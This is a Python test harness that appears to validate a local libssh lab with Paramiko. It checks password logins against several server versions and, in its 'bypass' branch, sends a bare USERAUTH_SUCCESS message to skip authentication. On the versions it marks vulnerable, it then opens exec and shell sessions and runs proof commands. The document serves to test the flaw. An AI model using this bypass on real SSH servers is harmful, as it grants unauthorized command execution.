"""Independent Paramiko controls against genuine libssh server code."""
from pathlib import Path
import base64
import hashlib
import json
import logging
import os
import re
import socket
import subprocess
import sys
import time

import paramiko
from paramiko.common import cMSG_USERAUTH_SUCCESS
from state import processes

logging.getLogger('paramiko').addHandler(logging.NullHandler())
logging.getLogger('paramiko').propagate = False
host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
phase = sys.argv[2] if len(sys.argv) > 2 else 'native'
root = Path('/tmp/libssh-lab')
roles = json.loads((root / 'pids.json').read_text())
record = {'host': host, 'phase': phase, 'paramiko_version': paramiko.__version__, 'uid': os.getuid(), 'profiles': {}, 'cases': [], 'rsa_zero_extensions': 0}


def full_width_signature(host_key, signature):
    # libgcrypt omits leading zero bytes from unsigned RSA signatures. Paramiko
    # 2.9.3 passes that short encoding to cryptography, which requires key width.
    # Match upstream 3.5.1's normalization; signature verification still runs:
    # https://github.com/paramiko/paramiko/blob/3.5.1/paramiko/rsakey.py
    message = paramiko.Message(signature)
    algorithm = message.get_text()
    if algorithm not in ['ssh-rsa', 'rsa-sha2-256', 'rsa-sha2-512']:
        return signature
    blob = message.get_binary()
    width = (paramiko.RSAKey(data=host_key).get_bits() + 7) // 8
    if len(blob) >= width:
        return signature
    normalized = paramiko.Message()
    normalized.add_string(algorithm)
    normalized.add_string(blob.rjust(width, b'\x00'))
    return normalized.asbytes()


class NativeTransport(paramiko.Transport):
    def _verify_key(self, host_key, signature):
        normalized = full_width_signature(host_key, signature)
        if normalized != signature:
            record['rsa_zero_extensions'] += 1
        return super()._verify_key(host_key, normalized)


capture = json.loads(Path('/opt/libssh-lab/rsa-short-signature.json').read_text())
public_key = base64.b64decode(capture['host_key_base64'])
signature = base64.b64decode(capture['signature_base64'])
exchange_hash = base64.b64decode(capture['exchange_hash_base64'])
key = paramiko.RSAKey(data=public_key)
assert key.verify_ssh_sig(exchange_hash, paramiko.Message(full_width_signature(public_key, signature)))
tampered = bytearray(signature)
tampered[-1] ^= 1
assert not key.verify_ssh_sig(exchange_hash, paramiko.Message(full_width_signature(public_key, bytes(tampered))))
record['rsa_fixture'] = {'sha256': hashlib.sha256(Path('/opt/libssh-lab/rsa-short-signature.json').read_bytes()).hexdigest(), 'valid_verified': True, 'tampered_rejected': True}


baseline = processes()
identities = {(row['pid'], row['starttime']) for row in baseline}


def idle():
    deadline = time.monotonic() + 7
    while True:
        rows = processes()
        extra = [row for row in rows if (row['pid'], row['starttime']) not in identities]
        if not extra:
            return
        if time.monotonic() >= deadline:
            raise RuntimeError('Native client close left provider processes: ' + json.dumps(extra))
        time.sleep(0.05)


def connect(port):
    stream = socket.create_connection((host, port), timeout=3)
    transport = NativeTransport(stream)
    transport.banner_timeout = 3
    transport.auth_timeout = 3
    try:
        transport.start_client(timeout=3)
    except BaseException:
        transport.close()
        raise
    return transport


def attempt(name, port, authentication, action='exec', pty=False, delayed=False):
    label = phase + '-' + name + '-' + authentication + '-' + action + '-' + str(int(pty)) + '-' + str(int(delayed))
    marker = 'libssh-' + label
    path = root / ('proof-' + label)
    assert not path.exists()
    transport = connect(port)
    result = {'profile': name, 'port': port, 'authentication': authentication, 'action': action, 'pty': pty, 'delayed': delayed, 'banner': transport.remote_version, 'host_key_sha256': hashlib.sha256(transport.get_remote_server_key().asbytes()).hexdigest(), 'channel_opened': False, 'request_accepted': False}
    channel = None
    try:
        if authentication == 'valid':
            transport.auth_password('myuser', 'mypassword')
            assert transport.is_authenticated()
        elif authentication == 'wrong':
            try:
                transport.auth_password('myuser', 'wrong-native-password')
            except paramiko.AuthenticationException as error:
                result['denied'] = type(error).__name__
            else:
                raise AssertionError('Native wrong password was accepted')
            assert not transport.is_authenticated()
            return result
        elif authentication == 'bypass':
            message = paramiko.Message()
            message.add_byte(cMSG_USERAUTH_SUCCESS)
            result['sent_message_hex'] = message.asbytes().hex()
            assert result['sent_message_hex'] == '34'
            transport._send_message(message)
        result['client_authenticated'] = transport.is_authenticated()
        try:
            channel = transport.open_session(timeout=1.2)
            result['channel_opened'] = True
            if pty:
                channel.get_pty()
            command = "printf %s '" + marker + "' > '" + str(path) + "';printf '\\nPID=%s UID=%s TTY=' $$ $(id -u);if test -t 0;then printf yes;else printf no;fi;printf '\\n'"
            if delayed:
                command = 'sleep 0.4;' + command
            if action in ['exec', 'exec-shell']:
                channel.exec_command(command if action == 'exec' else '/bin/sh')
                if action == 'exec-shell':
                    channel.sendall(command + '\nexit\n')
            else:
                channel.invoke_shell()
                channel.sendall(command + '\nexit\n')
            result['request_accepted'] = True
            data = b''
            errors = b''
            deadline = time.monotonic() + 4
            while time.monotonic() < deadline:
                if channel.recv_ready():
                    data += channel.recv(65536)
                if channel.recv_stderr_ready():
                    errors += channel.recv_stderr(65536)
                if channel.closed or (channel.exit_status_ready() and not channel.recv_ready() and not channel.recv_stderr_ready()):
                    break
                time.sleep(0.01)
            result.update(stdout_base64=base64.b64encode(data).decode(), stderr_base64=base64.b64encode(errors).decode(), exit_status=channel.recv_exit_status() if channel.exit_status_ready() else None)
            assert path.read_bytes() == marker.encode(), result
            assert path.stat().st_uid == 10001
            proof = re.findall(rb'(?:^|\n)PID=(\d+) UID=(\d+) TTY=(yes|no)\r?(?:\n|$)', data)
            assert proof and int(proof[-1][1]) == 10001 and (proof[-1][2] == b'yes') == pty, result
            result['proof'] = {'path': str(path), 'bytes': len(marker.encode()), 'sha256': hashlib.sha256(path.read_bytes()).hexdigest(), 'uid': path.stat().st_uid, 'pid': int(proof[-1][0]), 'tty': proof[-1][2].decode()}
        except (paramiko.SSHException, socket.timeout, EOFError, OSError) as error:
            result['error'] = {'type': type(error).__name__, 'message': str(error)}
    finally:
        if channel is not None:
            channel.close()
        transport.close()
        path.unlink(missing_ok=True)
        record['cases'].append(result)
        (root / ('native-' + phase + '.json')).write_text(json.dumps(record, indent=2) + '\n')
        idle()
    return result


manifest = subprocess.run(['sha256sum', '-c', '/opt/libssh/binaries.sha256'], cwd='/opt/libssh', capture_output=True, text=True, check=True)
record['binary_manifest'] = Path('/opt/libssh/binaries.sha256').read_text()
record['packages_sha256'] = hashlib.sha256(Path('/opt/runtime-packages.tsv').read_bytes()).hexdigest()
for name, pid in roles.items():
    if name == 'smtp':
        continue
    argv = (Path('/proc') / str(pid) / 'cmdline').read_bytes().rstrip(b'\0').decode().split('\0')
    version = Path(argv[0]).parent.name
    port = int(argv[argv.index('-p') + 1])
    mode = Path(argv[0]).name.removeprefix('server-')
    sdk = subprocess.check_output(['/opt/libssh/' + version + '/version'], text=True).strip()
    assert sdk.startswith(version)
    record['profiles'][name] = {'pid': pid, 'version': version, 'sdk': sdk, 'port': port, 'mode': mode}
    wrong = attempt(name, port, 'wrong')
    assert wrong.get('denied') and not wrong['channel_opened']
    unauthenticated = attempt(name, port, 'none')
    assert not unauthenticated['channel_opened'], unauthenticated
    valid = attempt(name, port, 'valid')
    assert valid['channel_opened'] and valid.get('proof'), valid
    shell = attempt(name, port, 'valid', action='shell', pty=True)
    assert shell.get('proof'), shell
    bypass = attempt(name, port, 'bypass')
    vulnerable = version in ['0.7.5', '0.8.3']
    assert bypass['channel_opened'] == vulnerable, bypass
    if vulnerable and mode == 'open':
        assert bypass.get('proof'), bypass
        for pty in [False, True]:
            shell = attempt(name, port, 'bypass', action='shell', pty=pty)
            assert shell.get('proof'), shell
        if name == 'affected-08':
            delayed = attempt(name, port, 'bypass', delayed=True)
            assert delayed.get('proof'), delayed
            alternative = attempt(name, port, 'bypass', action='exec-shell')
            assert alternative.get('proof'), alternative
        if name in ['affected-08', 'affected-07']:
            pty_exec = attempt(name, port, 'bypass', pty=True)
            assert pty_exec.get('proof'), pty_exec
    else:
        assert not bypass.get('proof'), bypass
with socket.create_connection((host, 2525), timeout=2) as stream:
    assert stream.recv(256).startswith(b'220 ')
record['persistent_processes'] = baseline
record['native_status'] = 'passed'
print(json.dumps(record))
